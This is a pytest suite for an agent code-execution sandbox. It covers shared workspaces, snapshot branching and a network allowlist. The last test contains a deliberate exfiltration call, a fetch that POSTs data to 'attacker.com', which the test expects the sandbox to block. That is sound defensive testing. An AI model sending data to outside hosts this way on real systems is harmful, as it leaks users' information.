import pytest
import os
import sys
import asyncio
import json
import shutil
from datetime import datetime

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from mayflower_sandbox import create_sqlite_pool, MayflowerSandboxBackend

@pytest.fixture
def anyio_backend():
    return 'asyncio'

@pytest.fixture
async def db_pool(tmp_path):
    db_path = str(tmp_path / "scenarios_more.db")
    pool = await create_sqlite_pool(db_path)
    yield pool
    await pool.close()

@pytest.mark.anyio
async def test_multi_agent_dev_workflow(db_pool, monkeypatch):
    """
    Scenario 4: Multi-Agent Package Development & Test
    1. Dev Agent creates a shared workspace 'package_dev'.
    2. Dev Agent writes a Python module and a test script.
    3. QA Agent joins, installs 'pytest', and runs the test script via shell.
    Tests: Collaborative VFS + Library Caching + Shell Integration.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    workspace = "package_dev"
    
    dev = MayflowerSandboxBackend(db_pool, "dev_agent", vfs_id=workspace)
    qa = MayflowerSandboxBackend(db_pool, "qa_agent", vfs_id=workspace, allow_net=True)

    # 1. Dev writes the code
    await dev.awrite("/home/my_utils.py", "def add(a, b): return a + b")
    await dev.awrite("/home/test_my_utils.py", """
from my_utils import add
def test_add():
    assert add(2, 3) == 5
    print("TEST_PASSED")

if __name__ == '__main__':
    test_add()
""")

    # 2. QA installs dependencies and runs tests
    # Note: Using micropip via Python execution to populate cache
    setup_res = await qa.aexecute("import micropip; await micropip.install('pytest')")
    assert setup_res.exit_code == 0
    
    # Run the test file using Python
    # (Since we are in a shared workspace, QA sees the files)
    run_res = await qa.aexecute("import sys; sys.path.append('/home'); import test_my_utils; test_my_utils.test_add()")
    assert run_res.exit_code == 0
    assert "TEST_PASSED" in run_res.output

@pytest.mark.anyio
async def test_branched_data_transformation(db_pool, monkeypatch):
    """
    Scenario 5: Speculative Data Transformation with Branching
    1. Agent loads a dataset.
    2. Agent takes snapshot 'main'.
    3. Agent performs experimental transformation A.
    4. Agent takes snapshot 'exp_a'.
    5. Agent reverts to 'main' and performs transformation B.
    6. Agent compares results.
    Tests: VFS Snapshotting + Multi-step stateful execution.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    backend = MayflowerSandboxBackend(db_pool, "data_agent", stateful=True)

    # 1. Initial State
    await backend.awrite("/home/data.json", json.dumps({"values": [1, 2, 3]}))
    await backend.aexecute("import json; data = json.loads(open('/home/data.json').read())")
    
    # 2. Branch: Main
    main_snap = await backend.acreate_snapshot()

    # 3. Experiment A: Multiply by 10
    await backend.aexecute("data['values'] = [v * 10 for v in data['values']]")
    res_a = await backend.aexecute("print(data['values'])")
    assert "[10, 20, 30]" in res_a.output
    
    # 4. Branch: Exp A
    exp_a_snap = await backend.acreate_snapshot()

    # 5. Revert to Main and try Experiment B: Square
    await backend.arestore_snapshot(main_snap)
    await backend.aexecute("data['values'] = [v * v for v in data['values']]")
    res_b = await backend.aexecute("print(data['values'])")
    assert "[1, 4, 9]" in res_b.output

    # 6. Verify we can still go back to Exp A if we wanted
    await backend.arestore_snapshot(exp_a_snap)
    res_final = await backend.aexecute("print(data['values'])")
    assert "[10, 20, 30]" in res_final.output

@pytest.mark.anyio
async def test_secure_cross_lang_scraper(db_pool, monkeypatch):
    """
    Scenario 6: Cross-language Scraper with Strict Security
    1. Agent uses eval_ts to fetch a "site" (api.github.com).
    2. Python processes the result.
    3. Agent attempts to exfiltrate to a forbidden domain and is blocked.
    Tests: TS Bridge + Network Allowlist + Inter-language data passing.
    """
    if not shutil.which("deno"):
        pytest.skip("Deno not found")

    monkeypatch.setenv("PYODIDE_POOL_SIZE", "1")
    # Only allow GitHub
    backend = MayflowerSandboxBackend(db_pool, "scraper_agent", allow_net=["api.github.com"], stateful=True)

    # 1. TS Fetch
    ts_code = "return await fetch('https://api.github.com/zen').then(r => r.text())"
    
    # Trigger bridge
    code = f"""
raw_data = await eval_ts({json.dumps(ts_code)})
processed = raw_data['result'].upper()
print(f"PROCESSED: {{processed}}")
"""
    res = await backend.aexecute(code)
    assert res.exit_code == 0
    assert "PROCESSED:" in res.output
    
    # 2. Blocked Exfiltration
    # Attempt to send 'processed' data to an unwhitelisted domain
    exfil_ts = "return await fetch('https://attacker.com', { method: 'POST', body: 'data' })"
    exfil_code = f"print(await eval_ts({json.dumps(exfil_ts)}))"
    
    res_blocked = await backend.aexecute(exfil_code)
    # Deno should block it and bridge should report success=False or NotCapable in stderr
    assert "NotCapable" in res_blocked.output or "PermissionDenied" in res_blocked.output or "'success': False" in res_blocked.output
    assert "attacker.com" in res_blocked.output
